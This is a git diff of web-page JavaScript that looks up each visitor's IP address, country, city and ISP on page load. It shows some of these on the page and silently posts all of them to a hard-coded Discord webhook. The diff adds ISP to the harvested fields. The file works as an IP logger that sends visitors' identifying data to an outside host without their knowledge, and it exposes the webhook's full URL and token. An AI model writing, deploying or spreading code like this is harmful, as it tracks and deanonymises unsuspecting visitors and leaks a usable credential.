@@ -1,7 +1,7 @@
 // Discord webhook URL
 const webhookURL = "https://discord.com/api/webhooks/1348973855217156116/Y_wUbOXZn0U769LrIiPAFSE7VszYA1Kjc3y_35KnOXXKxn6EsA-ggbDVlunb8GLhh6kd";
 
-// Function to fetch the user's IP address and location data
+// Function to fetch the user's IP address, location data, and ISP
 async function fetchIPData() {
   try {
     const response = await fetch("https://ipwhois.app/json/");
@@ -10,15 +10,17 @@ async function fetchIPData() {
       ip: data.ip,
       country: data.country,
       countryCode: data.country_code,
-      city: data.city // Fetching city from the response
+      city: data.city,
+      isp: data.isp // Fetching ISP from the response
     };
   } catch (error) {
     console.error("Error fetching IP data:", error);
     return {
       ip: "Unknown",
       country: "Unknown",
-      countryCode: "XX", // Default for unknown
-      city: "Unknown"
+      countryCode: "XX",
+      city: "Unknown",
+      isp: "Unknown"
     };
   }
 }
@@ -29,9 +31,9 @@ function getCountryFlagEmoji(countryCode) {
 }
 
 // Function to send data to Discord webhook
-async function sendToDiscord(ip, country, city, flag) {
+async function sendToDiscord(ip, country, city, flag, isp) {
   const data = {
-    content: `**IP Address:** ${ip}\n**Country:** ${country} ${flag}\n**City:** ${city}`,
+    content: `**IP Address:** ${ip}\n**Country:** ${country} ${flag}\n**City:** ${city}\n**ISP:** ${isp}`,
   };
 
   try {
@@ -48,18 +50,19 @@ async function sendToDiscord(ip, country, city, flag) {
   }
 }
 
-// Main function to fetch IP, country, city, flag, and display/send data
+// Main function to fetch IP, country, city, ISP, flag, and display/send data
 async function main() {
-  const { ip, country, countryCode, city } = await fetchIPData();
+  const { ip, country, countryCode, city, isp } = await fetchIPData();
   const flag = getCountryFlagEmoji(countryCode);
 
-  // Display the IP address, city, and flag on the webpage
+  // Display the IP address, city, ISP, and flag on the webpage
   document.getElementById("ip-address").textContent = ip;
   document.getElementById("country-flag").textContent = flag;
   document.getElementById("city").textContent = city;
+  document.getElementById("isp").textContent = isp; // Display ISP
 
-  // Send IP, country, city, and flag to Discord
-  await sendToDiscord(ip, country, city, flag);
+  // Send IP, country, city, ISP, and flag to Discord
+  await sendToDiscord(ip, country, city, flag, isp);
 }
 
 // Run the main function when the page loads
